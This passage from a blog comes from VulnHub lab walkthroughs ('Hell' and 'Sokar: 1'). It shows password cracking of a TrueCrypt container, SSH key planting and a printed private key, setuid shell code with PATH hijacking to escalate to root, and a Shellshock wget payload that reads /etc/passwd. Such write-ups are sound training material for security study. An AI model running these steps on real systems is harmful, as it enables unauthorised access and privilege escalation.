</span><span class='line'>-rw------- 1 george george 4194304 Jul 12 08:30 container.tc
</span><span class='line'>$ find / -user george -perm -g=s -o -perm -u=s -type f 2>/dev/null
</span><span class='line'>/usr/lib/openssh/ssh-keysign
</span><span class='line'>/usr/lib/pt_chown
</span><span class='line'>/usr/sbin/exim4
</span><span class='line'>/usr/bin/chsh
</span><span class='line'>/usr/bin/newgrp
</span><span class='line'>/usr/bin/sudo
</span><span class='line'>/usr/bin/procmail
</span><span class='line'>/usr/bin/chfn
</span><span class='line'>/usr/bin/gpasswd
</span><span class='line'>/usr/bin/passwd
</span><span class='line'>/usr/bin/sudoedit
</span><span class='line'>/usr/bin/game.py
</span><span class='line'>/usr/bin/lesson101
</span><span class='line'>/sbin/mount.nfs
</span><span class='line'>/var/mail/george
</span><span class='line'>/bin/umount
</span><span class='line'>/bin/ping
</span><span class='line'>/bin/su
</span><span class='line'>/bin/mount
</span><span class='line'>/bin/ping6
</span><span class='line'>$ ls -l /var/mail/george
</span><span class='line'>total 4
</span><span class='line'>-rw-r--r-- 1 george george 175 Jun 20  2014 signup.eml
</span><span class='line'>$ cat /var/mail/george/signup.eml
</span><span class='line'>From: admin@rockyou.com
</span><span class='line'>To: super_admin@hell.com
</span><span class='line'>Subject: Account Activation
</span><span class='line'>Date: 13th November 2009
</span><span class='line'>
</span><span class='line'>Thanks for signing up for your account. I hope you enjoy our services. 
</span><span class='line'>$</span></code></pre></td></tr></table></div></figure>


<p>Then I downloaded the container file <code>container.tc</code> to my Kali and use <code>truecrack</code> with rockyou.txt to crack the password. Due to my laptop do not have a strong GPU so I could not take advantage of hashcat which is really disappointed. T.T</p>

<p>However, the hard way is still working, just a little slow&hellip; after waiting for a quite while, I finally cracked the password: <em><font color="red">letsyouupdateyourfunnotesandmore</font></em></p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Hell1/5.png"></p>

<p>In order to get a better shell with full privilege of george, I use ssh-keygen to generate a new ssh key pair (passphrase is <em><font color="red">test1337</font></em>) and upload the public key to target server as <code>.ssh/authorized_keys</code>. Then use the private key to login via SSH.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# ssh-keygen
</span><span class='line'>Generating public/private rsa key pair.
</span><span class='line'>Enter file in which to save the key (/root/.ssh/id_rsa): g_id_rsa
</span><span class='line'>Enter passphrase (empty for no passphrase): 
</span><span class='line'>Enter same passphrase again: 
</span><span class='line'>Your identification has been saved in g_id_rsa.
</span><span class='line'>Your public key has been saved in g_id_rsa.pub.
</span><span class='line'>The key fingerprint is:
</span><span class='line'>81:82:98:44:59:c7:f2:68:fe:b8:76:04:f1:b1:a2:97 root@kali
</span><span class='line'>The key's randomart image is:
</span><span class='line'>+--[ RSA 2048]----+
</span><span class='line'>|.oo...           |
</span><span class='line'>|.+ +.o .         |
</span><span class='line'>|o . B + .        |
</span><span class='line'>|   = =   .       |
</span><span class='line'>|  + +   S        |
</span><span class='line'>| . E .           |
</span><span class='line'>|  . +            |
</span><span class='line'>|   o o           |
</span><span class='line'>|  ..o            |
</span><span class='line'>+-----------------+</span></code></pre></td></tr></table></div></figure>


<p>Now back to target server to create <code>.ssh</code> folder and pull the SSH private key from my Kali.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ mkdir .ssh
</span><span class='line'>$ cd .ssh
</span><span class='line'>$ wget http://10.10.10.131/g_id_rsa.pub -O authorized_keys
</span><span class='line'>--2015-07-16 10:19:59--  http://10.10.10.131/g_id_rsa.pub
</span><span class='line'>Connecting to 10.10.10.131:80... connected.
</span><span class='line'>HTTP request sent, awaiting response... 200 OK
</span><span class='line'>Length: 391
</span><span class='line'>Saving to: `authorized_keys'
</span><span class='line'>
</span><span class='line'>100%[==================================================================================================>] 391         --.-K/s   in 0s      
</span><span class='line'>
</span><span class='line'>2015-07-16 10:19:59 (59.7 MB/s) - `authorized_keys' saved [391/391]
</span><span class='line'>
</span><span class='line'>$ ls
</span><span class='line'>authorized_keys
</span><span class='line'>$ ls -l
</span><span class='line'>total 4
</span><span class='line'>-rw-r--r-- 1 george milk_4_life 391 Jul 16 00:19 authorized_keys
</span><span class='line'>$ /bin/chmod 600 authorized_keys
</span><span class='line'>$ ls -l
</span><span class='line'>total 4
</span><span class='line'>-rw------- 1 george milk_4_life 391 Jul 16 00:19 authorized_keys
</span><span class='line'>$</span></code></pre></td></tr></table></div></figure>


<p>SSH login with password <em><font color="red">test1337</font></em></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/hell# ssh george@10.10.10.146 -i g_id_rsa
</span><span class='line'>Enter passphrase for key 'g_id_rsa': 
</span><span class='line'>Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686
</span><span class='line'>
</span><span class='line'>The programs included with the Debian GNU/Linux system are free software;
</span><span class='line'>the exact distribution terms for each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>No mail.
</span><span class='line'>Last login: Thu Jul 16 10:14:43 2015 from 10.10.10.131
</span><span class='line'>george@hell:~$ id
</span><span class='line'>uid=1000(george) gid=1000(george) groups=1000(george),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
</span><span class='line'>george@hell:~$ pwd
</span><span class='line'>/home/george
</span><span class='line'>george@hell:~$ ls -l
</span><span class='line'>total 4096
</span><span class='line'>-rw------- 1 george george 4194304 Jul 12 08:30 container.tc
</span><span class='line'>george@hell:~$</span></code></pre></td></tr></table></div></figure>


<p>After get into the truecrypt container, I found a RSA private key file which should be someone&rsquo;s SSH key.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>george@hell:~$ truecrypt container.tc 
</span><span class='line'>Enter mount directory [default]: 
</span><span class='line'>Enter password for /home/george/container.tc: 
</span><span class='line'>Enter keyfile [none]: 
</span><span class='line'>Protect hidden volume (if any)? (y=Yes/n=No) [No]: 
</span><span class='line'>george@hell:~$ df -h
</span><span class='line'>Filesystem                                              Size  Used Avail Use% Mounted on
</span><span class='line'>rootfs                                                  7.6G  1.4G  5.8G  20% /
</span><span class='line'>udev                                                     10M     0   10M   0% /dev
</span><span class='line'>tmpfs                                                    51M  224K   51M   1% /run
</span><span class='line'>/dev/disk/by-uuid/c53be26e-768a-4c87-90d3-792c47148ca4  7.6G  1.4G  5.8G  20% /
</span><span class='line'>tmpfs                                                   5.0M     0  5.0M   0% /run/lock
</span><span class='line'>tmpfs                                                   178M     0  178M   0% /run/shm
</span><span class='line'>/dev/mapper/truecrypt1                                  3.8M  2.0K  3.8M   1% /media/truecrypt1
</span><span class='line'>george@hell:~$ cd /media/truecrypt1
</span><span class='line'>george@hell:/media/truecrypt1$ ls -l
</span><span class='line'>total 2
</span><span class='line'>-rwx------ 1 george george 1679 Jul  5  2014 id_rsa
</span><span class='line'>george@hell:/media/truecrypt1$ cat id_rsa
</span><span class='line'>-----BEGIN RSA PRIVATE KEY-----
</span><span class='line'>MIIEpQIBAAKCAQEAxlCbg0ln2dqRO3iIXPUvK3irg/9l5uvBAQdXTVmcm/JWN9OA
</span><span class='line'>25XtZX8LOfiJtc+8OYXgD6lXNVPh9BjElq6qpR7fk1TaXXUlyiSlwCxz68n/cpYs
</span><span class='line'>f6UUa9QXm0LSHD8m7g/e5qqIm8bb15TIC6+8TmSB11FE9NLPN+8hVyP1S9EBntom
</span><span class='line'>t5watKDFUNF+mcl14Tj+INcWB2qpEPgZ1mIwq1Zw3w/vy27y0i1r52+fot1vgf2K
</span><span class='line'>Ymo6GipsdxW1k/UuCjJEE6e0GZFA8vhpH5F4MG8k33vIPqkxgEgF0GX8RPAQF/Xf
</span><span class='line'>gxERhkGP+hVOd8b11OXzxWGGQyqwOYF8+7qVjwIDAQABAoIBAQCyldpFUvBDXbEV
</span><span class='line'>dgiOdXkh04vY1UBlv/3ROFQk4sLGKGf94+gRViUvFkX80VTptgWRY36Pe/Z9nmlG
</span><span class='line'>0JsP+oDPK0s4uNvf92Otcm0U7rMBLals/dFarUUDiT4s4fKl3zTmgsI+xGk6psxI
</span><span class='line'>icHPzFRt39KRHK1VLxXOD/jdKRN3Tk0odH1kNahOuFC2F5T+aqdlC/RAGwxnTDBe
</span><span class='line'>AFPFlns83GaPYlIt05DZsdGftG7mITkNfUVS5AIyeedshU4OyPXu5bGgUgbtars4
</span><span class='line'>GdttJ33Tm5hO+n3E93sW7XMKG4v4po+1Fu0OwNQNpaRo6gVqK7AZHNPxBRW7K4Zc
</span><span class='line'>w2d0EXehAoGBAOQgtqb5QVyhiCdT53xjZTMHH74ApWRpsoLtu/LaZnQV0v/dzEIv
</span><span class='line'>jei58v/PusXsSwOQeb4p2obOReQFbYG48vCiywwMbeOeqH2d69HYatHmxPXngKS3
</span><span class='line'>6trus/pHuDJosFw1qhgVo9ao0o8IH6cveHidmwvzKfiphgM3yCXF9jyxAoGBAN6L
</span><span class='line'>awHXmHQCsCq//UbHbfuaBScJOpaagKP1BIskl5RDaQ/U/DzSpxju0ldedX7HYVFW
</span><span class='line'>Rk6NQQ6QiXIC/5D7Xj+tcR2EFI+Tt9xp6dE/UlxpUL1h9QCBfmdw0CT9WSwJEGF7
</span><span class='line'>R+D18trKcb/NkYdJV8ZpaT00rLzyBx5MY/FZbYY/AoGBALrCwWXfR5BjOckgmrGt
</span><span class='line'>2cq1uVnew4h6M8eWgzklbZz5xPzuAuvobKAro3GkCb9BXIQ1gkWZlCqqsnMjsmvy
</span><span class='line'>EwnH7L0Xa9teJ4h3gfkQ2Rqwd2ztstanLyE/LJ7omjbCmCdVU8RV6wSwv3iTaP6B
</span><span class='line'>EXqFZMqarzDA8FKwFy49bAJxAoGBALkXBYG7uW1LSw/TLCjw9zVaTUzBLTxS9gjn
</span><span class='line'>YMcFQRir1Da5sqw3m4huIP1Pb7NoyjTm54SvkNs3NUlg2wPPPP0DGOAumRctCa9F
</span><span class='line'>W5WP78UyRlesoCOyj9oihsss9zxbsYcSDJ86j6iO1Xpr08zMIDfCNigUplJjja4S
</span><span class='line'>ZNE3ypLrAoGAbp+vBcqQRfnXWfmcdnHYFbwgWbokPSe2fScajWiyvcg4/6gL1e50
</span><span class='line'>rpO3RTOREUD02pBbyG4LDFv7x/5niqASL0tS8/0xWDBDj5QmD9UTmMd5hsMbj8Lw
</span><span class='line'>qJA0ErZEjIE9+jXYLbsTsB8tRTsqMqBfCCovHXAjy0h5B6j500PfImM=
</span><span class='line'>-----END RSA PRIVATE KEY-----
</span><span class='line'>george@hell:/media/truecrypt1$</span></code></pre></td></tr></table></div></figure>


<p>Then I download the SSH private key file to my Kali and try use it to login accounts found before.(only <strong>bazza</strong> and <strong>oj</strong> left)</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/hell# ssh bazza@10.10.10.146 -i tr_id_rsa 
</span><span class='line'>Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686
</span><span class='line'>
</span><span class='line'>The programs included with the Debian GNU/Linux system are free software;
</span><span class='line'>the exact distribution terms for each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>You have mail.
</span><span class='line'>Last login: Thu Jul 16 10:32:07 2015 from 10.10.10.131
</span><span class='line'>$ id
</span><span class='line'>uid=1004(bazza) gid=1004(bazza) groups=1004(bazza)
</span><span class='line'>$ ls -alh   
</span><span class='line'>total 40K
</span><span class='line'>drwx------ 3 bazza bazza      4.0K Jul 17 08:35 .
</span><span class='line'>drwxr-xr-x 7 root  root       4.0K Jul  5  2014 ..
</span><span class='line'>-rw-r--r-- 1 root  root        109 Jul  6  2014 barrebas.txt
</span><span class='line'>-rw------- 1 bazza bazza       492 Jul 13 01:33 .bash_history
</span><span class='line'>-r-xr-sr-x 1 oj    developers 6.1K Jul  6  2014 part1
</span><span class='line'>-r-sr-xr-x 1 oj    oj         5.2K Jul  6  2014 part2
</span><span class='line'>drwx------ 2 bazza bazza      4.0K Jul  5  2014 .ssh
</span><span class='line'>-rw------- 1 bazza bazza       781 Jul 13 01:42 .viminfo
</span><span class='line'>$</span></code></pre></td></tr></table></div></figure>


<h2>Moving to <strong>oj</strong></h2>

<p>Here we found executable program: <code>part1</code> and <code>part2</code> which has sticky bit set and owned by <strong>oj</strong>, so here should give a close check.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./part1
</span><span class='line'>Checking integrity of part2... Done!!
</span><span class='line'>
</span><span class='line'>Checking integrity of calling target... Done!!
</span><span class='line'>
</span><span class='line'>Binary and target confirmed.
</span><span class='line'>
</span><span class='line'>Can't touch this *nah na na na na naaaaaaaa nah*
</span><span class='line'>uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)
</span><span class='line'>$</span></code></pre></td></tr></table></div></figure>


<p>Here we can see that the running program has executed system command <code>id</code>. So very similar method used previously, I upload setuid.c and change it a little bit as follow and then gcc compile it to <code>/tmp/id</code>, then set environmental variable PATH to include <code>/tmp</code> at the beginning.</p>

<figure class='code'><figcaption><span>baz2.c  (baz2.c)</span> <a href='http://f4l13n5n0w.github.io/downloads/code/baz2.c'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'> <span class="n">setuid</span><span class="p">(</span> <span class="mi">1005</span> <span class="p">);</span>
</span><span class='line'> <span class="n">system</span><span class="p">(</span><span class="s">&quot;/usr/bin/id&quot;</span><span class="p">);</span>
</span><span class='line'> <span class="n">system</span><span class="p">(</span> <span class="s">&quot;/bin/sh -i&quot;</span> <span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ gcc baz2.c -o /tmp/id
</span><span class='line'>$ ls -l /tmp
</span><span class='line'>total 8
</span><span class='line'>-rwxr-xr-x 1 bazza bazza 5028 Jul 17 08:26 id
</span><span class='line'>$ ./part1
</span><span class='line'>Checking integrity of part2... Done!!
</span><span class='line'>
</span><span class='line'>Checking integrity of calling target... Done!!
</span><span class='line'>
</span><span class='line'>Binary and target confirmed.
</span><span class='line'>
</span><span class='line'>Can't touch this *nah na na na na naaaaaaaa nah*
</span><span class='line'>uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)
</span><span class='line'>oj
</span><span class='line'>$ whoami
</span><span class='line'>oj
</span><span class='line'>$ /usr/bin/id
</span><span class='line'>uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)</span></code></pre></td></tr></table></div></figure>


<p>Now, I am oj. :D</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ whoami 
</span><span class='line'>oj
</span><span class='line'>$ ls -al
</span><span class='line'>total 592
</span><span class='line'>drwx------ 2 oj   oj     4096 Jul 17 23:48 .
</span><span class='line'>drwxr-xr-x 7 root root   4096 Jul  5  2014 ..
</span><span class='line'>-r-sr-xr-x 1 root root 592549 Jul  5  2014 echo
</span><span class='line'>-rw-r--r-- 1 root root    154 Jul  5  2014 How to be an infosec rockstar 101.txt
</span><span class='line'>$ ./echo AAAA-%p-%p 
</span><span class='line'>AAAA-0x80488c0-0xbffffce8$ 
</span><span class='line'>$</span></code></pre></td></tr></table></div></figure>


<p>Here I found one executable file owned by <code>root</code> under oj&rsquo;s home folder and that file has sticky bit been set which could be a way to ROOT. Also <code>echo</code> program has <a href="https://www.owasp.org/index.php/Format_string_attack">Format String vulnerability</a></p>

<h2>Getting ROOT</h2>

<p>After suffering a lot of hours painful to deal with Format String exploit about <code>echo</code>. I still could not make it work for me :`(</p>

<p>However, there is another way to privilege escape to ROOT, which has been demostrated by <a href="http://vinicius777.github.io/blog/2014/07/14/truecrypt-privilege-escalation/">vincius777</a></p>

<figure class='code'><figcaption><span>getroot2.c  (getroot2.c)</span> <a href='http://f4l13n5n0w.github.io/downloads/code/getroot2.c'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'> <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'> <span class="n">system</span><span class="p">(</span> <span class="s">&quot;/bin/sh -i&quot;</span> <span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>george@hell:~$ df -h
</span><span class='line'>Filesystem                                              Size  Used Avail Use% Mounted on
</span><span class='line'>rootfs                                                  7.6G  1.4G  5.8G  20% /
</span><span class='line'>udev                                                     10M     0   10M   0% /dev
</span><span class='line'>tmpfs                                                    51M  224K   51M   1% /run
</span><span class='line'>/dev/disk/by-uuid/c53be26e-768a-4c87-90d3-792c47148ca4  7.6G  1.4G  5.8G  20% /
</span><span class='line'>tmpfs                                                   5.0M     0  5.0M   0% /run/lock
</span><span class='line'>tmpfs                                                   178M     0  178M   0% /run/shm
</span><span class='line'>/dev/mapper/truecrypt1                                  1.8M   26K  1.7M   2% /media/truecrypt1
</span><span class='line'>george@hell:~$ cd /media/truecrypt1
</span><span class='line'>george@hell:/media/truecrypt1$ ls -l
</span><span class='line'>total 18
</span><span class='line'>-rwsrwxrwx 1 root root   152 Jul 17 17:13 getroot
</span><span class='line'>-rwsrwxrwx 1 root root  4970 Jul 17 17:14 getroot2
</span><span class='line'>drwx------ 2 root root 12288 Jul 17 17:09 lost+found
</span><span class='line'>george@hell:/media/truecrypt1$ ./getroot2
</span><span class='line'># id
</span><span class='line'>uid=0(root) gid=1000(george) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(george)
</span><span class='line'># pwd
</span><span class='line'>/media/truecrypt1
</span><span class='line'># whoami
</span><span class='line'>root
</span><span class='line'># cat /root/flag.txt
</span><span class='line'>Congratulations of beating Hell. 
</span><span class='line'>
</span><span class='line'>I hope you enjoyed it and there weren't to many trolls in here for you. 
</span><span class='line'>
</span><span class='line'>Hit me up on irc.freenode.net in #vulnhub with your thoughts (Peleus) or follow me on twitter @0x42424242
</span><span class='line'>
</span><span class='line'>Flag: a95fc0742092c50579afae5965a9787c54f1c641663def1697f394350d03e5a53420635c54fffc47476980343ab99951018fa6f71f030b9986c8ecbfc3a3d5de
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>#</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[Vulnhub]Sokar: 1]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/07/07/vulnhub-sokar-1/"/>
    <updated>2015-07-07T02:41:59-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/07/07/vulnhub-sokar-1</id>
    <content type="html"><![CDATA[<p>Sokar is created by <a href="http://rastamouse.me/">Rasta Mouse</a> and it also is the first competition in 2015 run by VulnHub team.</p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/sokar-1,113/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali Linux (<em>10.10.10.131/24</em>)</p>

<p>Target: Sokar (<em>10.10.10.145/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>Shellshock (Bash bug) give attacker a way to break in and also get ROOT</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">Net Discover</font>]</li>
<li>Port scanned the target to discover the running services and open ports [<font color="FF8000">nmap</font>]</li>
<li>Web information gathering and interacting with the web server [<font color="FF8000">firefox</font>]</li>
<li>Shellshock vulnerability detect and check [<font color="FF8000">wget</font>]</li>
<li>Analysis and write script to exploit shellshock bug</li>
<li>Poked around in the file system and found sensitive information</li>
<li>Hijack executable program to get reverse shell</li>
<li>Exploit shellshock bug to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://nixgeneration.com/~jaime/netdiscover/">netdiscover</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="http://www.gnu.org/software/wget/">wget</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using netdiscover as routine to detect the target&rsquo;s IP address (10.10.10.145 in this case).</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Sokar1/1.png"></p>

<p>10.10.10.145 is our Target!</p>

<p>Then run NMAP scan to detect opening ports/running services on the target. From the result, found apache 2.2.15 is running on port 591 and the target OS is CentOS Linux.</p>

<p><code>nmap -sV -v -O -A -T5 -p- 10.10.10.145</code></p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Sokar1/2.png"></p>

<p>Then I open iceweasel browser to have a close look at port 591.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Sokar1/3.png"></p>

<p>From the content displayed, we know the server is running system command: <code>netstat</code> and <code>iostat</code></p>

<p>From the source code, we found an URL: <code>http://10.10.10.145:591/cgi-bin/cat</code></p>

<h3>It&rsquo;s time to try shellshock (bash bug)</h3>

<p>After googled <code>shellshock</code>, I found some topics talking about how to test/exploit shellshock vulnerability in CGI. The following command is picked from <a href="http://security.stackexchange.com/questions/68122/what-is-a-specific-example-of-how-the-shellshock-bash-bug-could-be-exploited">one</a> of them.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wget -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://10.10.10.145:591/cgi-bin/cat -O /temp.txt</span></code></pre></td></tr></table></div></figure>


